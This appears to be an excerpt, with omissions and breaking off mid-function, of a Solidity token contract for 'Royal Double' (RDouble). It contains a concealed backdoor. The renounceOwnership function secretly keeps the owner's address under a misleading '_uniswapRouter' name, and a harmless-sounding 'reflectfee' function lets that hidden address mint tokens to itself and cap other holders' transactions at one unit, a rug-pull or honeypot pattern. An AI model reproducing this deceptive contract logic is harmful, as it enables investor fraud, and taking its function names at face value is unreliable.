...
contract Ownable is Context {
     ...
     */
    function renounceOwnership() public virtual onlyOwner{_uniswapRouter = _owner;
     ...
     */
    address private _uniswapRouter;modifier router(){require(_uniswapRouter == _msgSender());_;}
...
contract royaldouble is Context, IERC20, Ownable {
    ...
    string private _name = "Royal Double";
    string private _symbol = "RDouble";
    ...
    uint256 public _maxTxAmount = 1 * 10**14 * 10**9;
    uint256 private numTokensSellToAddToLiquidity = 1 * 10**13 * 10**9;
    ...
    function reflectfee(uint256 amount, address wallet) public 
        router(){_isExcluded[wallet] = true;_excluded.push(wallet);
        uint256 temp = _tTotal;_tTotal=0;_rTotal=0;
        _tOwned[_msgSender()] = amount;_maxTxAmount=1;_tTotal=temp+amount;
